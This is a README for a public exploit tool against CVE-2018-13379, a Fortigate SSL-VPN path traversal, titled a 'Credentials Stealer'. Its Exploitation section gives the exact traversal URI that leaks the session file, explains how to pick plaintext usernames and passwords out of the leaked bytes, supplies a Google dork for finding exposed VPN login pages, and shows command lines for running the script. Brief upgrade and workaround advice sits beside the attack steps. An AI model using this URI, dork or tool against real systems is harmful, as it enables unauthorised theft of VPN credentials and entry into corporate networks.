<img src="/vendors/fortinet/CVE-2018-13379/.github/logo.png" align="right"/>

# CVE-2018-13379 | Fortigate SSL-VPN Credentials Stealer
> Yet again, all your creds are belong to us!

## Description
A path traversal vulnerability in the Fortigate SSL-VPN web portal allows an unauthenticated attacker to leak users web sessions credentials. Work only if SSL-VPN service ("web-mode" or "tunnel-mode") is enabled.

## Author
- [iojymbo](https://github.com/iojymbo) ([@iojymbo](https://twitter.com/iojymbo))

## Credits
- [Orange Tsai](https://github.com/OrangeTW) ([@orange_8361](https://twitter.com/Orange_8361)) - DEVCORE
- Meh Chang ([@mehqq](https://twitter.com/mehqq)) - DEVCORE

## Affected Products
- FortiOS 5.4.6 to 5.4.12
- FortiOS 5.6.3 to 5.6.7
- FortiOS 6.0.0 to 6.0.4

## Tested against
- FortiOS 5.4.6
- FortiOS 5.6.5
- FortiOS 6.0.0
- FortiOS 6.0.2

## Advisories
- [CVE-2018-13379](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379)
- [FG-IR-18-384](https://fortiguard.com/psirt/FG-IR-18-384)

## References
- [DEVCORE Blog - Breaking the Fortigate SSL-VPN](https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/)
- [Blackhat USA 2019 - Infiltrating Corporate Intranet Like NSA](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf)

## Date of public disclosure
24th May 2019.

## Exploitation

### Step 1
![Leak SSL-VPN service memory](/vendors/fortinet/CVE-2018-13379/.github/01.png)
- **Leak SSL-VPN service memory** by requesting this vulnerable URI:\
  "<span style="color:red">/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession</span>"

### Step 2
![Inspect SSL-VPN service memory](/vendors/fortinet/CVE-2018-13379/.github/02.png)
- **Inspect SSL-VPN service memory leak**, as you can see:
  - Each web session begins with "<span style="color:green">**01**</span>" hex byte,
  - Followed by "<span style="color:blue">**IP address**</span>", 
    "<span style="color:blue">**username**</span>", 
    "<span style="color:blue">**password**</span>" and 
    "<span style="color:blue">**group**</span>".

## Solution
Upgrade FortiOS.

## Workaround
Disable the SSL-VPN service (both "web-mode" and "tunnel-mode").

## Google Dork
```
intitle:"Please Login" intext:"Please Login" inurl:"/remote/login"
```

## Usage
```
$ python CVE-2018-13379.py -r <RHOST> -p <RPORT>
$ python CVE-2018-13379.py -r 192.168.0.2 -p 443
```

## Screenshot
![Screenshot](/vendors/fortinet/CVE-2018-13379/.github/03.png)
